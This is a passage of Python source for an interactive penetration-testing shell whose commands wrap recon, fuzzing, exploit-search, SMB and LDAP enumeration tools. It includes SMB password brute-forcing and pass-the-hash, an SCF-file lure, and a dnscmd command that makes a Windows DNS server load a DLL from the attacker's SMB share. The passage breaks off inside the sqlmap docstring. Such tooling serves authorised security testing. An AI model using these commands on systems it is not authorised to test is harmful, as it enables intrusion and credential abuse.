            "404string": input("    [?] Ignore this string in response body content as negative response (always). Can be a regular expression: ")
        }

        nikto_command = f"nikto -h {options['host']}"

        for key, value in options.items():
            if value:
                if key == "host":
                    continue
                elif key in ["ask", "check6", "dbcheck", "followredirects", "ipv4", "ipv6", "list_plugins", "nointeractive", "nolookup", "nossl", "noslash", "no404", "ssl", "usecookies", "useproxy", "version"]:
                    nikto_command += f" --{key} {value}"
                else:
                    nikto_command += f" --{key} {value}"

        print_msg(f"Running nikto with the following command: {nikto_command}")
        self.cmd(nikto_command)
        return

    @cmd2.with_category(recon_category)
    def do_finalrecon(self, line):
        """
        Runs the `finalrecon` tool to perform a web server vulnerability scan against the specified target host.

        1. Executes `finalrecon` with the `-h` option to specify the target host IP address.

        :param line: This parameter is not used in the current implementation but could be used to specify additional options or arguments if needed.
        :param rhost: The IP address of the target web server, specified in the `params` dictionary.

        :returns: None

        Manual execution:
        To manually perform a web server vulnerability scan using `finalrecon`, use the following command:
            finalrecon --url=http://<target_ip> --full -o txt -cd <directory_reports>

        Replace `<target_ip>` with the IP address of the target web server. For example:
            finalrecon --url=http://192.168.1.92 --full -o txt -cd /home/gris/finalrecon
        """

        if not is_binary_present("finalrecon"):
            print_error(f"You need install finalrecon first:{GREEN} apt install finalrecon")
            return

        if not line:
            print_error(f"You must pass the url to perfom the scann ex: {GREEN}finalrecon http://10.10.10.10/")
            return
        command = f"finalrecon --url={line} --full -o txt -cd sessions/finalrecon_manual "
        copy2clip(command)
        self.cmd(command)
        return

    @cmd2.with_category(recon_category)
    def do_openssl_sclient(self, line):
        """
        Uses `openssl s_client` to connect to a specified host and port, allowing for testing and debugging of SSL/TLS connections.

        :param line: The port number to connect to on the target host. This must be provided as an argument.
        :param rhost: The IP address or hostname of the target server, specified in the `params` dictionary.

        :returns: None

        Manual execution:
        To manually connect to a server using `openssl s_client` and test SSL/TLS, use the following command:
            openssl s_client -connect <target_ip>:<port>

        Replace `<target_ip>` with the IP address or hostname of the target server and `<port>` with the port number. For example:
            openssl s_client -connect 10.10.10.10:443
        """

        if not self.params["rhost"] or not line:
            print_error(
                "rhost must be assign and you need pass the port by argument ex: openssl_sckient 443"
            )
            return
        rhost = self.params["rhost"]
        domain = self.params["domain"]
        print_msg(f"Try... openssl s_client -connect  {rhost}:{line} {RESET}")
        self.cmd(f"openssl s_client -connect  {rhost}:{line}")
        command = f"true | openssl s_client -connect {domain}:443 2>/dev/null | openssl x509 -noout -text  | perl -l -0777 -ne '@names=/\\bDNS:([^\s,]+)/g; print join(\"\n\", sort @names);' | tee sessions/domains_{domain}.txt"
        print_msg(command)
        self.cmd(command)
        return

    @cmd2.with_category(exploitation_category)
    def do_ss(self, line):
        """
        Uses `searchsploit` to search for exploits in the Exploit Database based on the provided search term.

        :param line: The search term or query to find relevant exploits. This must be provided as an argument.

        :returns: None

        Manual execution:
        To manually search for exploits using `searchsploit`, use the following command:
            searchsploit <search_term>

        Replace `<search_term>` with the term or keyword you want to search for. For example:
            searchsploit kernel
        """

        print_msg(f"Searching in searchsploit{RESET}")
        self.cmd(f"searchsploit {line}")


        getnvd = find_ss(line)
        nvddb(getnvd)
        getnvd = find_ea(line)
        exploitalert(getnvd)
        getnvd = find_ps(line)
        packetstormsecurity(getnvd)
        self.cmd(f"msfconsole -q -x \"search {line}; exit\"")
        line = line.replace(" ","+")
        if not is_binary_present("pompem"):
            self.display_toastr("Not Found pompem, installing", type="warning")
            self.cmd("sudo apt install pompem -y")
        self.cmd(f"cd sessions && pompem -s {line} --txt")
        self.onecmd(f"creds_py '{line}'")
        print_msg(f"To open use Ctrl + Click: {BLUE}{UNDERLINE}https://sploitus.com/?query={line}#exploits")
        print_msg(f"To open use Ctrl + Click: {BLUE}{UNDERLINE}https://exploits.shodan.io/?q={line}")
        return

    @cmd2.with_category(scanning_category)
    def do_wfuzz(self, line):
        """
        Uses `wfuzz` to perform fuzzing based on provided parameters. This function supports various options for directory and file fuzzing.

        :param line: The options and arguments for `wfuzz`. The `line` parameter can include the following:
            - `sub <domain>`: Fuzz DNS subdomains. Requires `dnswordlist` to be assign.
            - `iis`: Fuzz IIS directories. Uses a default wordlist if `iiswordlist` is not assign.
            - Any other argument: General directory and file fuzzing.

        :returns: None

        Manual execution:
        To manually use `wfuzz` for directory and file fuzzing, use the following commands:

        1. For fuzzing DNS subdomains:
            wfuzz -c <extra_options> -t <threads> -w <wordlist> -H 'Host: FUZZ.<domain>' <domain>

        Example:
            wfuzz -c --hl=7 -t 200 -w /path/to/dnswordlist -H 'Host: FUZZ.example.com' example.com

        2. For fuzzing IIS directories:
            wfuzz -c <extra_options> -t <threads> -w /path/to/iiswordlist http://<rhost>/FUZZ

        Example:
            wfuzz -c --hl=7 -t 200 -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/IIS.fuzz.txt http://10.10.10.10/FUZZ

        3. For general directory and file fuzzing:
            wfuzz -c <extra_options> -t <threads> -w <wordlist> http://<rhost>/FUZZ

        Example:
            wfuzz -c --hl=7 -t 200 -w /path/to/dirwordlist http://10.10.10.10/FUZZ
        """

        dirwordlist = self.params["dirwordlist"]
        choice = input("    [!] Enter the numer 1 to directory-list-2.3-medium.txt 2 to raft-large-words.txt [1/2] (Default 2): ") or '2'
        if choice == '2':
            dirwordlist = dirwordlist.replace("directory-list-2.3-medium.txt", "raft-large-words.txt")
        rhost = self.params["rhost"]
        url = self.params["url"]
        url = get_domain(url)
        choice = input(f"    [?] Use 1 to url or 2 to rhost (default {url})") or '1'
        if choice == '1':
            rhost = url
        if not rhost or not dirwordlist:
            print_error(f"dirwordlist and rhost must be assign{RESET}")
            return

        if line:
            if line.startswith("sub"):
                params = line.split(" ")
                count = len(params)
                dnswordlist = self.params["dnswordlist"]
                if not dnswordlist:
                    print_error(
                        "use payload or p to load the parameter from payload.json, or just assign dnswordlist path/to/dnswordlist"
                    )
                    return

                if count == 1:
                    print_error(
                        f"you must pass the dommain like argument ex:{GREEN} wfuzz sub box.htb"
                    )
                    return

                arg1 = params[0]
                domain = params[1]
                if count > 2:
                    arg3 = params[2]
                else:
                    arg3 = ""
                print_msg(
                    f"Try ...  wfuzz -c {arg3} -t 200 -w {dnswordlist} -H 'Host: FUZZ.{domain}' {domain} {RESET}"
                )
                self.cmd(
                    f"wfuzz -c {arg3} -t 200 -w {dnswordlist} -H 'Host: FUZZ.{domain}' {domain}"
                )
                return

            if line.startswith("iis"):
                params = line.split(" ")
                print_msg(params)
                count = len(params)
                arg1 = params[0]
                iiswordlist = "/usr/share/wordlists/SecLists-master/Discovery/Web-Content/IIS.fuzz.txt"  # dont know why this line dont work ... self.params['iiswordlist']

                if not os.path.exists(iiswordlist):
                    print_error(
                        f"you must have file iiswordlist use the command: getseclist, use p or payload to load parameters from payload.json, or just assign iiswordlist /pat/to/iiswordlist"
                    )
                    return
                # Abre el archivo en modo de lectura
                if count > 1:
                    arg3 = params[1]
                else:
                    arg3 = ""
                print_msg(
                    f"Try ...  wfuzz -c {arg3} -t 200 -w {iiswordlist} http://{rhost}/FUZZ {RESET}"
                )
                self.cmd(
                    f"wfuzz -c {arg3} -t 200 -w {iiswordlist} http://{rhost}/FUZZ"
                )
                return

        print_msg(
            f"Try ... wfuzz -c {line} -t 200 -w {dirwordlist} http://{rhost}/FUZZ {RESET}"
        )
        self.cmd(f"wfuzz -c {line} -t 200 -w {dirwordlist} http://{rhost}/FUZZ")
        return

    @cmd2.with_category(recon_category)
    def do_launchpad(self, line):
        """
        Searches for packages on Launchpad based on the provided search term and extracts codenames from the results. The distribution is extracted from the search term.

        :param line: The search term to be used for querying Launchpad. The `line` parameter should be a string containing
                    the search term, e.g., "8.2p1 Ubuntu 4ubuntu0.11".

        :returns: None

        Manual execution:
        To manually execute the equivalent command, use the following steps:

        1. Extract the distribution from the search term:
        - This function assumes the distribution name is part of the search term and is used to build the URL.

        2. URL encode the search term:
        - Replace spaces with `%20` to form the encoded search query.

        3. Use `curl` to perform the search and filter results:
        curl -s "https://launchpad.net/+search?field.text=<encoded_search_term>" | grep 'href' | grep '<distribution>' | grep -oP '(?<=href="https://launchpad.net/<distribution>/)[^/"]+' | sort -u

        Example:
            If the search term is "8.2p1 Ubuntu 4ubuntu0.11", the command would be:
            curl -s "https://launchpad.net/+search?field.text=8.2p1%20Ubuntu%204ubuntu0.11" | grep 'href' | grep 'ubuntu' | grep -oP '(?<=href="https://launchpad.net/ubuntu/)[^/"]+' | sort -u

        Notes:
            - Ensure that `curl` is installed and accessible in your environment.
            - The extracted codenames are printed to the console.
        """

        parts = line.split()
        if len(parts) > 1:
            distribution = parts[1].lower()
        else:
            distribution = "ubuntu"

        encoded_line = quote(line.strip())

        command = f"curl -s \"https://launchpad.net/+search?field.text={encoded_line}\" | grep 'href' | grep '{distribution}' | grep -oP '(?<=href=\"https://launchpad.net/{distribution}/)[^/\"]+' | sort -u"

        print_msg(
            "Searches for packages on Launchpad based on the provided search, no warranties. ssh package give the best results"
        )
        self.cmd(command)

    @cmd2.with_category(scanning_category)
    def do_gobuster(self, line):
        """
        Uses `gobuster` for directory and virtual host fuzzing based on provided parameters. Supports directory enumeration and virtual host discovery.

        :param line: The options and arguments for `gobuster`. The `line` parameter can include the following:
            - `url`: Perform directory fuzzing on a specified URL. Requires `url` and `dirwordlist` to be assign.
            - `vhost`: Perform virtual host discovery on a specified URL. Requires `url` and `dirwordlist` to be assign.
            - Any other argument: General directory fuzzing with additional parameters.

        :returns: None

        Manual execution:
        To manually use `gobuster`, use the following commands:

        1. For directory fuzzing:
            gobuster dir --url <url>/ --wordlist <wordlist>

        Example:
            gobuster dir --url http://example.com/ --wordlist /path/to/dirwordlist

        2. For virtual host discovery:
            gobuster vhost --append-domain -u <url> -w <wordlist> --random-agent -t 600

        Example:
            gobuster vhost --append-domain -u http://example.com -w /path/to/dirwordlist --random-agent -t 600

        3. For general directory fuzzing with additional parameters:
            gobuster dir --url http://<rhost>/ --wordlist <wordlist> <additional_parameters>

        Example:
            gobuster dir --url http://10.10.10.10/ --wordlist /path/to/dirwordlist -x .php,.html
        """
        if not is_binary_present("gobuster"):
            print_warn("Gobuster not found on your system... instaling...")
            command = "go install github.com/OJ/gobuster/v3@latest"
            print_msg(f"Try... {command}")
            self.cmd(command)
            print_warn("Add ~/go/bin to your path in your .bashrc or .zshrc file")

        dirwordlist = self.params["dirwordlist"]
        choice = input("    [!] Enter the numer 1 to directory-list-2.3-medium.txt 2 to raft-large-words.txt [1/2] (Default 2): ") or '2'
        if choice == '2':
            dirwordlist = dirwordlist.replace("directory-list-2.3-medium.txt", "raft-large-words.txt")
        rhost = self.params["rhost"]
        if not rhost or not dirwordlist:
            print_error(f"rhost and dirwordlist must be assign {RESET}")
            return
        if line == "url":
            url = self.params["url"]
            if not url:
                print_error(f"url must be assign, ex: assign url http://domain.ext {RESET}")
                return
            print_msg(f"Try gobuster dir --url {url}/ --wordlist {dirwordlist} --add-slash{RESET}")
            self.cmd(f"gobuster dir --url {url}/ --wordlist {dirwordlist} --add-slash")
            return
        if line.startswith("vhost"):
            url = self.params["url"]
            if not url:
                print_error(f"url must be assign, ex: assign url http://domain.ext {RESET}")
                return
            print_msg(
                f"Try gobuster vhost --append-domain -u {url} -w {dirwordlist} --random-agent -t 600{RESET}"
            )
            self.cmd(
                f"gobuster vhost --append-domain -u {url} -w {dirwordlist} --random-agent -t 600"
            )
            return
        print_msg(
            f"Try... gobuster dir --url http://{rhost}/ --wordlist {dirwordlist} {line} --add-slash{RESET}"
        )
        self.cmd(f"gobuster dir --url http://{rhost}/ --wordlist {dirwordlist} {line} --add-slash")
        return

    @cmd2.with_category(miscellaneous_category)
    def do_addhosts(self, line):
        """
        Adds an entry to the `/etc/hosts` file, mapping an IP address to a domain name.

        :param line: The domain name to be added to the `/etc/hosts` file.
            - Example: `permx.htb`

        :returns: None

        Manual execution:
        To manually add a domain to the `/etc/hosts` file, use the following command:

            sudo sh -c -e "echo '<rhost> <domain>' >> /etc/hosts"

        Example:
            sudo sh -c -e "echo '10.10.11.23 permx.htb' >> /etc/hosts"

        This command appends the IP address and domain name to the `/etc/hosts` file, enabling local resolution of the domain.
        """
        self.onecmd("PTMultiTools")

        return

    @cmd2.with_category(scanning_category)
    def do_cme(self, line):
        """
        Execute CrackMapExec (CME) for SMB enumeration and authentication attempts against a target.

        This function provides a range of SMB operations using CME, including:
        1. RID brute-forcing, which attempts to enumerate users via RID cycling.
        2. Share enumeration to list SMB shares on the target.
        3. User authentication to verify credentials against the target.
        4. Brute-force authentication using username and password lists.
        5. Hash-based authentication to attempt access using an NTLM hash.

        Parameters:
        line (str): Specifies the action to perform, which can be one of the following:
                    - "rid": Enumerates users by attempting RID brute-force.
                    - "shares": Lists SMB shares on the target.
                    - "user": Verifies credentials from a stored credential file or prompts for a username and password.
                    - "brute": Attempts brute-force authentication using a user and password dictionary.
                    - "hash": Attempts authentication using an NTLM hash file.
                    If no valid option is provided, the function defaults to performing basic SMB enumeration.

        Returns:
        None

        Manual Execution Example:
        To manually run CrackMapExec for SMB enumeration, use:

            crackmapexec smb <target>

        Example:
            crackmapexec smb 10.10.11.24

        This command performs basic SMB enumeration and checks against the specified target IP address.
        """
        path = os.getcwd()
        rhost = self.params["rhost"]
        domain = self.params["domain"]
        if check_rhost(rhost):
            if line:
                if line.startswith("rid"):
                    if not os.path.exists(f"{path}/sessions/credentials.txt"):
                        username = input("    [!] Enter the username with domain (default 'Administrator'): ").strip() or 'administrator'
                        password = input("    [!] Enter the password (default: admin): ").strip() or 'admin'
                    else:
                        path_cred = get_credentials(True)
                        with open(path_cred, "r") as file:
                            for file_line in file:
                                params = file_line.split(":")
                                username = params[0]
                                password = params[1].replace("\n", "")

                    print_msg(f"Try... crackmapexec smb {rhost} -u {username} -p {password} --rid-brute")
                    self.cmd(f"crackmapexec smb {rhost} -u {username} -p {password} --rid-brute")
                    print_warn(f"Done... crackmapexec smb {rhost} -u {username} -p {password} --rid-brute")
                    return
                elif line.startswith("shares"):
                    path_cred = get_credentials(True)

                    if not os.path.exists(path_cred):
                        username = input("    [!] Enter the username with domain (e.g., 'user@domain.com'): ").strip()
                        password = input("    [!] Enter the password: ").strip()
                    else:
                        with open(path_cred, "r") as file:
                            for file_line in file:
                                params = file_line.split(":")
                                username = params[0]
                                password = params[1].replace("\n", "")
                    print_msg(f"Try... crackmapexec smb {rhost} -u {username} -p {password} --shares")
                    self.cmd(f"crackmapexec smb {rhost} -u {username} -p {password} --shares")
                    print_warn(f"Done... crackmapexec smb {rhost} -u {username} -p '{password}' --shares")
                    return
                elif line.startswith("user"):
                    path_cred = get_credentials(True)

                    if not os.path.exists(path_cred):
                        username = input("    [!] Enter the username with domain (e.g., 'user@domain.com'): ").strip()
                        password = input("    [!] Enter the password: ").strip()
                    else:
                        with open(path_cred, "r") as file:
                            for file_line in file:
                                params = file_line.split(":")
                                username = params[0]
                                password = params[1].replace("\n", "")
                    print_msg(f"Try... crackmapexec smb {rhost} -u {username} -p {password}")
                    self.cmd(f"crackmapexec smb {rhost} -u {username} -p '{password}'")
                    print_warn(f"Done... crackmapexec smb {rhost} -u {username} -p '{password}'")
                    return
                elif line.startswith("brute"):
                    print_msg("Enter the users diccionary:")
                    path_cred = get_users_dic()
                    print_msg("Enter the password diccionary:")
                    pass_cred = get_users_dic()
                    if not os.path.exists(path_cred):
                        print_error(f"Error with the file: {pass_cred}")
                        return
                    else:
                        print_msg("Brute-forcing SMB... this may take several minutes...")
                        command = f"crackmapexec smb {rhost} -d {domain} -u {path_cred} -p {pass_cred} --continue-on-success"
                        print_msg(f"Try... {command}")
                        self.cmd(command)
                        print_warn(f"Done... {command}")
                        return
                elif line.startswith("hash"):
                    rhost = self.params["rhost"]
                    domain = self.params["domain"]
                    selected_hash_path = get_hash(dir=True)

                    if selected_hash_path:
                        with open(selected_hash_path, "r") as file:
                            hash_content = file.read().strip()
                        selected_hash = hash_content.split(":")[1]
                        username = os.path.basename(selected_hash_path).replace("hash_", "").replace(".txt", "")
                        if selected_hash:
                            command = f"cme smb {rhost} -d {domain} -u {username} -H {selected_hash}"
                            print_msg(f"Executing: {command}")
                            self.cmd(command)
                        else:
                            print_error("No hash content found. Exiting.")
                    else:
                        print_error("No hash file selected. Exiting.")
            else:
                print_msg(f"Try... crackmapexec smb {rhost}")
                self.cmd(f"crackmapexec smb {rhost}")
                print_msg(f"Done... crackmapexec smb {rhost}")
        return

    @cmd2.with_category(scanning_category)
    def do_ldapdomaindump(self, line):
        """
        Dumps LDAP information using `ldapdomaindump` with credentials from a file.

        :param line: The domain to use for authentication (e.g., 'domain.local').

        :returns: None

        Manual execution:
        To manually run `ldapdomaindump` for LDAP enumeration, use the following command:

            ldapdomaindump -u '<domain>\\<username>' -p '<password>' <target>

        Example:
            ldapdomaindump -u 'domain.local\\Administrator' -p 'passadmin123' 10.10.11.23

        Ensure you have a file `sessions/credentials.txt` in the format `user:password`, where each line contains credentials for the LDAP enumeration.
        """

        rhost = self.params["rhost"]
        if not rhost or not line:
            print_error(
                "Add domain and rhost must be assign to more info see help assign (assign rhost 10.10.10.10) ex: addhost domain.ext"
            )
            return
        path_cred = "sessions/credentials.txt"
        if not os.path.exists(path_cred):
            print_error(
                "You must have file sessions/credentials.txt with this format: user:password"
            )
            return

        with open(path_cred, "r") as file:

            for file_line in file:
                params = file_line.split(":")
                user = params[0]
                passwd = params[1].replace("\n", "")
                print_msg(
                    f"    {GREEN}[*] Try... ldapdomaindump -u '{line}\\{user}' -p '{passwd}' {rhost}"
                )
                self.cmd(
                    f"cd sessions && ldapdomaindump -u '{line}\\{user}' -p '{passwd}' {rhost}"
                )
        return

    @cmd2.with_category(scanning_category)
    def do_bloodhound(self, line):
        """Perform LDAP enumeration using bloodhound-python with credentials from a file.

        :param line: This parameter is not used in the function but could be used for additional options or domain information.

        :returns: None

        Manual execution:
        To manually run `bloodhound-python` for LDAP enumeration, use the following command:

            bloodhound-python -c All -u '<username>' -p '<password>' -ns <target>

        Example:
            bloodhound-python -c All -u 'usuario' -p 'password' -ns 10.10.10.10

        Ensure you have a file `sessions/credentials.txt` with the format `user:password`, where each line contains credentials for enumeration.
        """
        rhost = self.params["rhost"]
        url = self.params["url"]
        domain = self.params["domain"]
        subdomain = self.params["subdomain"]

        if check_rhost(rhost):
            path_cred = "sessions/credentials.txt"
            if not os.path.exists(path_cred):
                print_error(
                    "You must have file sessions/credentials.txt with this format: user:password more help createcredentials"
                )
                return
            with open(path_cred, "r") as file:
                for file_line in file:
                    params = file_line.split(":")
                    user = params[0]
                    passwd = params[1].replace("\n", "")
                    dc = input(f"    [!] enter DC subdomain example dc01: (Default: {subdomain})") or subdomain

                    if  dc:
                        sub = f" -gc '{dc}.{domain}' "
                    else:
                        sub = " "
                    print_msg(
                        f"    {GREEN}[*] Try... bloodhound-python -u '{user}' -p '{passwd}' -d '{domain}' {sub} -ns {rhost} -c all --zip"
                    )
                    command = f"cd sessions && bloodhound-python -u '{user}' -p '{passwd}' -d '{domain}' {sub} -ns {rhost} -c all --zip"
                    self.cmd(command)
                    self.logcsv(f"ldapsearch {command}")
        return

    @cmd2.with_category(recon_category)
    def do_ping(self, line):
        """Perform a ping to check host availability and infer the operating system based on TTL values.

        :param line: This parameter is not used in the function but could be used for additional options or settings.

        :returns: None

        Manual execution:
        To manually ping a host and determine its operating system, use the following command:

            ping -c 1 <target>

        Example:
            ping -c 1 10.10.10.10

        The TTL (Time To Live) value is used to infer the operating system:
        - TTL values around 64 typically indicate a Linux system.
        - TTL values around 128 typically indicate a Windows system.

        Ensure you have assign `rhost` to the target host for the command to work.
        """
        os_json = []
        rhost = self.params["rhost"]
        if check_rhost(rhost):
            print_msg(f"Try... ping -c 1 {rhost} ")
            result = subprocess.run(
                ["ping", "-c", "1", rhost], capture_output=True, text=True
            )

            if result.returncode == 0:
                try:
                    ttl_index = result.stdout.find("ttl=")
                    if ttl_index != -1:
                        ttl_value = int(
                            result.stdout[ttl_index + 4 : ttl_index + 7]
                        )
                        print_msg(f"TTL:{ttl_value}")
                        if ttl_value <= 60 or ttl_value <= 64:
                            print_msg(
                                f"{GREEN}Host activo {CYAN}probablemente es {BLUE}Linux{RESET}"
                            )
                            os_json.append({
                                "id": '2',
                                "os": 'Linux',
                                "ttl": ttl_value,
                                "state": 'active'
                            })
                        elif ttl_value <= 120 or ttl_value <= 128:
                            print_msg(
                                f"{GREEN}Host activo {CYAN}probablemente es {RED}Windows{RESET}"
                            )
                            os_json.append({
                                "id": '1',
                                "os": 'Windows',
                                "ttl": ttl_value,
                                "state": 'active'
                            })
                        else:
                            print_error(
                                "No se puede determinar con certeza el sistema operativo"
                            )
                            os_json.append({
                                "id": '4',
                                "os": 'Unknown',
                                "ttl": ttl_value,
                                "state": 'active'
                            })
                    else:
                        print_error("No se encontró el TTL en la salida del ping")
                        os_json.append({
                            "id": '4',
                            "os": 'Unknown',
                            "ttl": 'NULL',
                            "state": 'inactive'
                        })
                except ValueError:
                    print_error("No se pudo convertir el TTL a un número entero")
            else:
                print_error("No se pudo realizar el ping al host")
            print_msg(f"Done... ping -c 1 {rhost} ")
            with open('sessions/os.json', 'w') as json_file:
                json.dump(os_json, json_file, indent=4)
        return

    @cmd2.with_category(recon_category)
    def do_gospider(self, line):
        """Try gospider for web spidering.

        This function executes the `gospider` tool to perform web spidering. It can either use a URL provided as a parameter or the remote host defined in `self.params`.

        Usage:
            gospider url
            gospider

        :param line: Command parameter that determines the execution mode. Use "url" to specify a URL, or leave empty to use the remote host.
        :type line: str

        - If `line` is "url", the method uses the URL specified in `self.params["url"]`.
        - If `line` is not "url", the method uses the remote host specified in `self.params["rhost"]`.

        :returns: None

        Manual execution:
        1. Ensure that the `gospider` tool is installed on the system.
        2. assign the `url` parameter if using the "url" mode.
        3. Run the method to perform the spidering operation.

        Dependencies:
        - `gospider` must be installed on the system.
        - The `sudo` command must be available for installing `gospider`.

        Examples:
            1. To scan a specific URL: `gospider url`
            2. To scan the remote host: `gospider`

        Note:
            - If `gospider` is not installed, the method will attempt to install it.
            - Ensure that the network and tools are configured correctly for successful execution.
        """
        cmd = f"""{RED}
            ──▐─▌──▐─▌──
            ─▐▌─▐▌▐▌─▐▌─
            ─█▄▀▄██▄▀▄█─
            ──▄──██▌─▄──
            ▄▀─█▀██▀█─▀▄
            ▐▌▐▌─▐▌─▐▌▐▌
            ─▐─█────█─▌─
            ────▌──▐────
        """
        print_msg(cmd)
        rhost = self.params["rhost"]
        if line == "url":
            url = self.params["url"]
            if not url:
                print_error(
                    "If you pass the param url, url mus be assign, ex: assign url http://url.ext"
                )
                return

            print_msg(f"Try gospider -s {url}")
            self.cmd(f"gospider -s {url}")

            print_msg(cmd)
            return

        if line == "ssl":
            url = self.params["url"].replace("http","https")
            if not url:
                print_error(
                    "If you pass the param url, url mus be assign, ex: assign url http://url.ext"
                )
                return

            print_msg(f"Try gospider -s {url}")
            self.cmd(f"gospider -s {url}")

            print_msg(cmd)
            return

        if not check_rhost(rhost):
            return
        if is_binary_present("gospider"):
            print_msg(f"try... gospider -s http://{rhost}")
            self.cmd(f"gospider -s http://{rhost}")
            print_msg(cmd)
        else:
            print_msg(
                "gospider is not installed, installing... (control + c to cancel)"
            )
            self.cmd(f"sudo apt install gospider -y && gospider -s http://{rhost}")
            print_msg(cmd)

    @cmd2.with_category(scanning_category)
    def do_arpscan(self, line):
        """
        Executes an ARP scan using `arp-scan`.

        This function performs an ARP scan on the local network using the `arp-scan` tool. The network device to be used for scanning must be specified.

        Usage:
            arpscan

        :param line: Command parameters (not used in this function).
        :type line: str

        - Executes the `arp-scan` command with the specified network device.

        :returns: None

        Manual execution:
        1. Ensure that the network device is assign using the appropriate parameter.
        2. Run the method to perform an ARP scan.

        Dependencies:
        - `arp-scan` must be installed on the system.
        - The `sudo` command must be available for executing `arp-scan`.

        Examples:
            1. assign the device parameter using `assign device <network_device>`.
            2. Run `arpscan` to perform the ARP scan.

        Note:
            - The network device must be configured and available on the system for the scan to work.
            - Ensure that `arp-scan` is installed and accessible from the command line.
        """

        if not self.params["device"]:
            print_error("device must be assign")
            return
        device = self.params["device"]
        print_msg("try to arp-scan sudo arp-scan -I DEVICE --localnet")
        self.cmd(f"sudo arp-scan -I {device} --localnet")

    @cmd2.with_category(exploitation_category)
    def do_lazypwn(self, line):
        """
        Executes the LazyPwn script.

        This function runs the `lazypwn.py` script located in the `modules` directory. The script is typically used for automated exploitation or security testing tasks within the LazyOwn framework.

        Usage:
            lazypwn

        :param line: Command parameters (not used in this function).
        :type line: str

        - Executes the `lazypwn.py` script with Python 3.

        :returns: None

        Manual execution:
        1. Run the method to execute the LazyPwn script.

        Dependencies:
        - The `lazypwn.py` script must be present in the `modules` directory.
        - Python 3 must be installed and accessible from the command line.

        Examples:
            1. Run `do_lazypwn` to execute the LazyPwn script.

        Note:
            - Ensure that `lazypwn.py` is configured correctly before running this method.
            - The script's functionality depends on its implementation in `modules/lazypwn.py`.
        """

        self.cmd("python3 modules/lazypwn.py")

    @cmd2.with_category(miscellaneous_category)
    def do_fixel(self, line):
        """
        Fixes file permissions and line endings in the project directories.

        This function converts line endings from DOS/Windows format to Unix format for all files in the project directories. This helps to ensure consistent line endings and can prevent issues related to file format mismatches.

        Usage:
            fixel

        :param line: Command parameters (not used in this function).
        :type line: str

        :returns: None

        Manual execution:
        1. Run the method to fix line endings in the specified directories.

        Dependencies:
        - The `dos2unix` command must be installed and accessible from the command line.

        Examples:
            1. Run `do_fixel` to convert line endings for all files in the project directories.

        Note:
            - This method only fixes line endings and does not modify file permissions.
            - Ensure that the `dos2unix` command is installed and functioning correctly.
        """

        self.cmd("dos2unix *")
        self.cmd("dos2unix modules/*")
        self.cmd("dos2unix modules/cgi-bin/*")

    @cmd2.with_category(privilege_escalation_category)
    def do_smbserver(self, line):
        """
        Sets up an SMB server using Impacket and creates an SCF file for SMB share access.

        This function configures an SMB server to serve files from the `sessions` directory and generates an SCF file that points to the SMB share. The SCF file can be used to create a shortcut to the SMB share on a Windows system.

        Usage:
            smbserver

        :param line: Command parameters folder name (optional).
        :type line: str

        - Checks if `lhost` is valid using the `check_lhost` function.
        - Creates an SCF file (`sessions/file.scf`) with configuration to access the SMB share.
        - Copies a curl command to the clipboard for downloading the SCF file from the SMB share.
        - Starts an SMB server using Impacket to serve the `sessions` directory.

        :returns: None

        Manual execution:
        1. Ensure `lhost` is assign to a valid IP address or hostname.
        2. Run the method to create the SCF file and start the SMB server.
        3. Use the copied curl command to download the SCF file on the target system.
        4. Ensure that `impacket-smbserver` is installed and accessible from the command line.

        Dependencies:
        - The `impacket-smbserver` tool must be installed and accessible from the command line.
        - The `check_lhost` function must validate the `lhost` parameter.

        Examples:
            1. Run `do_smbserver` to assign up the SMB server and generate the SCF file.
            2. Use the provided curl command to download the SCF file on the target system.

        Note:
            - The SCF file is used to create a shortcut to the SMB share and should be accessible from the target system.
            - Ensure that the `lhost` parameter is correctly assign and that the SMB server is properly configured.
        """
        if line:
            folder = line
        else:
            folder = 'smbfolder'
        lhost = self.params["lhost"]
        if not check_lhost(lhost):
            return
        choice = input(f"    [!] Enter your choice {GREEN}1) {WHITE}to file.scf attack, {GREEN}2){WHITE} to dnscmd dll attack or {GREEN}3) simple server with username (default: 2)") or '2'
        if choice == '1':
            #TODO: Refactor
            revshell = f"""[Shell]
            Command=2
            IconFile=\\\\\\\\{lhost}\\{folder}\\icon.ico
            [Taskbar]
            Command=ToggleDesktop
            """.replace("        ", "")
            print_msg(f"Try... echo '{revshell}' > sessions/file.scf ")
            self.cmd(f"echo '{revshell}' > sessions/file.scf ")
            print_msg(f"echo 'curl http://{lhost}/file.scf' |  xclip -sel clip")
            print_msg(f"command copied to clipboard")
            print_msg(f"trying sudo impacket-smbserver {folder} $(pwd) -smb2support ...")
            self.cmd(
                f"echo 'curl http://{lhost}/file.scf -o file.scf' |  xclip -sel clip"
            )
            self.cmd(
                f"cd sessions && sudo impacket-smbserver {folder} $(pwd) -smb2support"
            )
        elif choice == '2':
            lhost = self.params["lhost"]
            command = f"cd sessions && sudo impacket-smbserver {folder} $(pwd) -smb2support"
            print_msg(command)
            attack = f'cmd /c dnscmd localhost /config /serverlevelplugindll \\{lhost}\\{folder}\\da.dll'
            copy2clip(attack)
            self.cmd(command)
        elif choice == "3":
            command = f"cd sessions && sudo impacket-smbserver -username guest -password guest {folder} $(pwd) -smb2support"
            print_msg(command)
            attack = f"net use x: \\\\{lhost}\\{folder} /user:guest guest"
            copy2clip(attack)
            self.cmd(command)
        else:
            print_error("wrong choice (1/2)")
        return

    @cmd2.with_category(exploitation_category)
    def do_sqlmap(self, line):
        """
        Uses sqlmap to perform SQL injection testing on a given URL or request file (you can get one with burpsuit or proxy command and foxyproxy plugin for browser).

        This function allows the execution of sqlmap commands with various options, including testing URL endpoints, reading from request files, and using sqlmap's wizard mode for easy configuration.

        Usage:
            sqlmap req <request_file>
            sqlmap req <request_file> <parameter>
            sqlmap req <request_file> <parameter> <database>
            sqlmap req <request_file> <parameter> <database> <table>
            sqlmap -wiz

        :param line: Command parameters for sqlmap.
        :type line: str

        - If `line` starts with `req`, it expects the following formats:
        - `req <request_file> <parameter>`: Tests the specified parameter in the request file for SQL injection.
        - `req <request_file> <parameter> <database>`: Tests the specified parameter and attempts to dump tables from the specified database.
        - `req <request_file> <parameter> <database> <table>`: Tests the specified parameter and attempts to dump data from the specified table in the database.

        - If `line` starts with `-wiz`, it runs sqlmap's wizard mode for interactive configuration.

        - If `line` is empty, it uses the URL specified in `self.params["url"]` to perform SQL injection testing with sqlmap.

        :returns: None

        Manual execution:
        1. If using `req`, provide a valid request file and parameters.
        2. Run sqlmap with the specified options for SQL injection testing.
